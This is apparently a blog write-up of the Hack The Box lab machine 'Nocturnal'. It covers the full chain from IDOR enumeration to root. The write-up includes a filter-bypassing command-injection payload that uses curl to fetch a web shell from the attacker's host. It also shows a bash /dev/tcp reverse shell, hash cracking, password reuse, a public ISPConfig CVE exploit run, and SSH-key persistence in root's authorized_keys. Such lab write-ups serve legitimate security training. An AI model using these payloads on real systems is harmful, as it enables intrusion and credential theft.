---
title: 'HTB Writeup - Nocturnal'
date: 2025-11-03 17:00:00 +0000
categories: [HTB Easy Machines]
tags: [Easy, Linux, HTB, Value Fuzzing, PHP, Filter Bypass, Command Injection, Hashcat, Local Port Forward, ISPConfig, Password Reuse]
---

<img src="/assets/img/nocturnal/image.png">

Nocturnal is an easy HTB machine where you have to abuse an `IDOR` vulnerability to get access to the admin panel where by reading the source code we can craft a `command injection` payload bypassing the filters. From there, we `locally forward` a service running internally and make use of `password reusage` to get a valid session. Finally we exploit a vulnerability on the service to get root access.

# Reconnaissance
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ nmap -np- -Pn -sVC --min-rate 5000 -oN nmap-scan.txt 10.10.11.64
Nmap scan report for 10.10.11.64
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  3 17:30:43 2025 -- 1 IP address (1 host up) scanned in 54.11 seconds
```
> SSH, HTTP

> Let's add the hostname to our /etc/hosts file: `echo -e '10.10.11.64\tnocturnal.htb' | sudo tee -a /etc/hosts`

Let's take a look at [http://nocturnal.htb/](http://nocturnal.htb/):
<img src="/assets/img/nocturnal/image2.png">

# Exploit
## IDOR

After uploading a file we get a share link:
<img src="/assets/img/nocturnal/image3.png">
>`http://nocturnal.htb/view.php?username=t3mpx&file=test.pdf`

Fuzzing for different usernames gives us some possible users:
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=a.pdf' -c -w /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -ic -sa -mc all -fc 404 -fs 2985 -H 'Cookie: PHPSESSID=mv6mku2r8bau6ft7paiejahufh'
                                                                              
        /'___\  /'___\           /'___\                                       
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/        

       v2.1.0-dev
________________________________________________

<SNIP>

________________________________________________                                                                                                            
                                                                              
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 42ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 38ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 37ms]
```
> Navigating to [http://nocturnal.htb/view.php?username=amanda&file=test.pdf](http://nocturnal.htb/view.php?username=amanda&file=test.pdf) reveals a `privacy.odt file`

The file contains the following:
```text
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
Yours sincerely,
Nocturnal's IT team
```
> Possible credentials: amanda:arHkG7HAI68X8s1J

## PHP Filter Bypass

Accesing as amanda gives us access to the admin dashboard, where we can download a backup of the site.

Reading the file `admin.php`, we can craft a payload to bypass the filter and inject our command in the zip function:

```php
function cleanEntry($entry) {                                                 
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];        
                                                                              
    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {      
            return false; // Malicious input detected
        } 
    }         
    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
?>
```
> Special character filter

```php
$password = cleanEntry($_POST['password']);
```
> Password to be used in the ZIP

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```
> Command used to create the zip

Let's set up a python server hosting [p0wny shell](https://github.com/flozz/p0wny-shell) and run the payload in BurpSuite:
<img src="/assets/img/nocturnal/image4.png">
> `a"curl%0910.10.14.6/shell.php%09-o%09shell.php%09#` 

>Using `"` to break out of the PHP command, URL-encoded tabs instead of spaces and a `#` to ignore everything after.

```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.64 - - [03/May/2025 14:07:49] "GET /shell.php HTTP/1.1" 200 -
```

# Lateral Movement
## Shell as www-data

The web shell will be hosted in [http://nocturnal.htb/shell.php](http://nocturnal.htb/shell.php), let's get a reverse shell for more commodity:

```bash
www-data@nocturnal:…/www/nocturnal.htb# bash -c 'bash -i >& /dev/tcp/10.10.14.6/9001 0>&1'
```

```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.64] 37516
bash: cannot set terminal process group (861): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$
```

## Shell as tobias

In the folder `~/nocturnal_database` we find a SQLite3 database:
```bash
www-data@nocturnal:~/nocturnal_database$ ls
nocturnal_database.db
www-data@nocturnal:~/nocturnal_database$ sqlite3 nocturnal_database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
uploads  users  
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
```
> Some hashes

### hashcat

Let's crack them with hashcat:
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```
> Possible credentials tobias:slowmotionapocalypse

Let's SSH in:
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ sshpass -p slowmotionapocalypse ssh tobias@nocturnal.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-212-generic x86_64)
                                                                              
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 04 May 2025 12:23:06 PM UTC

 <SNIP>

 Last login: Sun May 4 12:23:43 2025 from 10.10.14.6
tobias@nocturnal:~$
```

### User flag

```bash
tobias@nocturnal:~$ cat user.txt 
952b7954533886e1e15669344742255f
```

## Shell as root

After some basic enumeration we come accross the following:
```bash
tobias@nocturnal:~$ ss -tulpn
Netid          State           Recv-Q          Send-Q                   Local Address:Port                      Peer Address:Port          Process          
udp            UNCONN          0               0                        127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               151                          127.0.0.1:3306                           0.0.0.0:*                              
tcp            LISTEN          0               10                           127.0.0.1:587                            0.0.0.0:*                              
tcp            LISTEN          0               4096                         127.0.0.1:8080                           0.0.0.0:*                              
tcp            LISTEN          0               511                            0.0.0.0:80                             0.0.0.0:*                              
tcp            LISTEN          0               4096                     127.0.0.53%lo:53                             0.0.0.0:*                              
tcp            LISTEN          0               128                            0.0.0.0:22                             0.0.0.0:*                              
tcp            LISTEN          0               10                           127.0.0.1:25                             0.0.0.0:*                              
tcp            LISTEN          0               70                           127.0.0.1:33060                          0.0.0.0:*                              
tcp            LISTEN          0               128                               [::]:22                                [::]:*                              
```
> Something is running interally at port 8080

Let's set up a local port forward:
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ sshpass -p slowmotionapocalypse ssh -NL 8081:127.0.0.1:8080 tobias@nocturnal.htb
```

Visiting the service shows it's a ISPCONFIG instance:
<img src="/assets/img/nocturnal/image5.png">
> Reusing the password of tobias with the admin user gives us access

Using the following [exploit](https://github.com/ajdumanhug/CVE-2023-46818) gives us a pseudo-shell as root:
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ python3 CVE-2023-46818.py 127.0.0.1:8081 admin slowmotionapocalypse
[-] URL missing scheme (http:// or https://), adding http:// by default.
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_4601d048f40afd7feb171269
[+] CSRF Key: f8ad4c014d25d05f775443666b84e2aff9e3d0ef
[+] Injecting shell payload...
[+] Shell written to: http://127.0.0.1:8081/admin/sh.php
[+] Launching shell...

ispconfig-shell#
```

Let's upgrade to a better shell with SSH:


```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ ssh-keygen -t rsa -b 4096 -N "" -C "" -f nocturnal
Generating public/private rsa key pair.                    
Your identification has been saved in nocturnal
Your public key has been saved in nocturnal.pub                                                                                                             
The key fingerprint is:
<SNIP>
```

```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$cat nocturnal.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBwCZURE75Ba4tWNlVoraddDtkMw4GMku...
```

```bash
ispconfig-shell# mkdir /root/.ssh; touch /root/.ssh/authorized_keys
```

```bash
ispconfig-shell# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBwCZURE75Ba4tWNlVoraddDtkMw4GMku...' >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys
```
```bash
[t3mpx@parrot]─[~/htb/easy/nocturnal]
└──★$ ssh -i nocturnal root@nocturnal.htb
root@nocturnal:~#
```

### Root flag
```bash
root@nocturnal:~# cat root.txt 
502e1063918b5411ed0d99b7e9821f15
```



